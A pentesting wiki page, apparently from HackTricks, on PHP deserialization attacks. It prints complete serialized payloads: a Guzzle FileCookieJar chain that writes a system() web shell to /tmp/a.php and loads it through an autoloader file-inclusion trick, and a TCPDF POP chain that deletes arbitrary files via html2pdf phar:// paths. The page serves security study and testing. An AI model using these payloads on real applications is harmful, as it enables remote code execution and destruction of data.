# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

First, you should check what are [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

We are in a situation where we found a **PHP deserialization in a webapp** with **no** library vulnerable to gadgets inside **`phpggc`**. However, in the same container there was a **different composer webapp with vulnerable libraries**. Therefore, the goal was to **load the composer loader of the other webapp** and abuse it to **load a gadget that will exploit that library with a gadget** from the webapp vulnerable to deserialization.

Steps:

- You have found a **deserialization** and there **isn’t any gadget** in the current app code
- You can abuse a **`spl_autoload_register`** function like the following to **load any local file with `.php` extension**
  - For that you use a deserialization where the name of the class is going to be inside **`$name`**. You **cannot use "/" or "."** in a class name in a serialized object, but the **code** is **replacing** the **underscores** ("\_") **for slashes** ("/"). So a class name such as `tmp_passwd` will be transformed into `/tmp/passwd.php` and the code will try to load it.\
    A **gadget example** will be: **`O:10:"tmp_passwd":0:{}`**

```php
spl_autoload_register(function ($name) {

   if (preg_match('/Controller$/', $name)) {
       $name = "controllers/${name}";
   } elseif (preg_match('/Model$/', $name)) {
       $name = "models/${name}";
   } elseif (preg_match('/_/', $name)) {
       $name = preg_replace('/_/', '/', $name);
   }

   $filename = "/${name}.php";

   if (file_exists($filename)) {
       require $filename;
   }
   elseif (file_exists(__DIR__ . $filename)) {
       require __DIR__ . $filename;
   }
});
```

> [!TIP]
> If you have a **file upload** and can upload a file with **`.php` extension** you could **abuse this functionality directly** and get already RCE.

In my case, I didn’t have anything like that, but there was inside the **same container** another composer web page with a **library vulnerable to a `phpggc` gadget**.

- To load this other library, first you need to **load the composer loader of that other web app** (because the one of the current application won’t access the libraries of the other one.) **Knowing the path of the application**, you can achieve this very easily with: **`O:28:"www_frontend_vendor_autoload":0:{}`** (In my case, the composer loader was in `/www/frontend/vendor/autoload.php`)
- Now, you can **load** the others **app composer loader**, so it’s time to **`generate the phpgcc`** **payload** to use. In my case, I used **`Guzzle/FW1`**, which allowed me to **write any file inside the filesystem**.
  - NOTE: The **generated gadget was not working**, in order for it to work I **modified** that payload **`chain.php`** of phpggc and set **all the attribute**s of the classes **from private to public**. If not, after deserializing the string, the attributes of the created objects didn’t have any values.
- Now we have the way to **load the others app composer loader** and have a **phpggc payload that works**, but we need to **do this in the SAME REQUEST for the loader to be loaded when the gadget is used**. For that, I sent a serialized array with both objects like:
  - You can see **first the loader being loaded and then the payload**

```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```

- Now, we can **create and write a file**, however, the user **couldn’t write in any folder inside the web server**. So, as you can see in the payload, PHP calling **`system`** with some **base64** is created in **`/tmp/a.php`**. Then, we can **reuse the first type of payload** that we used to as LFI to load the composer loader of the other webapp t**o load the generated `/tmp/a.php`** file. Just add it to the deserialization gadget:

```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```

**Summary of the payload**

- **Load the composer autoload** of a different webapp in the same container
- **Load a phpggc gadget** to abuse a library from the other webapp (the initial webapp vulnerable to deserialization didn’t have any gadget on its libraries)
- The gadget will **create a file with a PHP payload** on it in /tmp/a.php with malicious commands (the webapp user cannot write in any folder of any webapp)
- The final part of our payload will use **load the generated php file** that will execute commands

I needed to **call this deserialization twice**. In my testing, the first time the `/tmp/a.php` file was created but not loaded, and the second time it was correctly loaded.

## TCPDF `__destruct` POP chain for arbitrary file deletion

When a real `TCPDF` instance is garbage-collected it calls `_destroy(true)`, iterates over `$this->imagekeys`, and `unlink()`s anything that looks like a cache file under `K_PATH_CACHE`. If an application performs `unserialize($user_data)` while the `TCPDF` class is loaded (e.g. it expects an array with an `html` key), you can supply a serialized object that sets:

- `file_id` to any integer that is not present in `self::$cleaned_ids` (e.g. `-1`).
- `imagekeys` to paths that begin with `K_PATH_CACHE` or that can be made to look like it (e.g. `/tmp/../tmp/do_not_delete_this_file.txt` when `K_PATH_CACHE` is `/tmp/`).

Example payload hitting an unsafe `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` flow:

```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```

The file is deleted as soon as the object falls out of scope. TCPDF 6.9.3 tightened the check to only remove paths with the `__tcpdf_<file_id>_` prefix inside `K_PATH_CACHE` and introduced `_unlink()` to block non-`file://` schemes, so older `Producer` versions are prime targets.

### Triggering the gadget via `phar://` in html2pdf `<cert>` tags

`spipu/html2pdf` (≤5.3.0) wraps TCPDF and exposes a custom `<cert>` block whose `src`/`privkey` attributes are validated with plain `file_exists()`. On PHP < 8.0 any filesystem function that touches a `phar://` URL causes the Phar metadata to be unserialized. By storing the malicious TCPDF object above inside a Phar archive you gain a reliable POP even if the application never calls `unserialize()` itself.

1. Craft a Phar with `phar.readonly=0`, set the stub/manifest to look like an image (e.g. rename `archive.phar` to `archive.png`), and store the serialized TCPDF object in the Phar metadata.
2. Upload/place the file somewhere reachable such as `/tmp/user_files/user_1/archive.png`.
3. Submit HTML containing the CERT tag so html2pdf resolves the attacker-controlled path:

```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
      privkey="phar:///tmp/user_files/user_1/archive.png" />
```

The call to `file_exists()` deserializes the metadata, instantiates TCPDF, and its destructor deletes the chosen file, turning html2pdf into a powerful `phar://` entry point. Version 5.3.1 added `Security::checkValidPath()` to block unapproved schemes, so legacy deployments remain attractive.

## References

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}



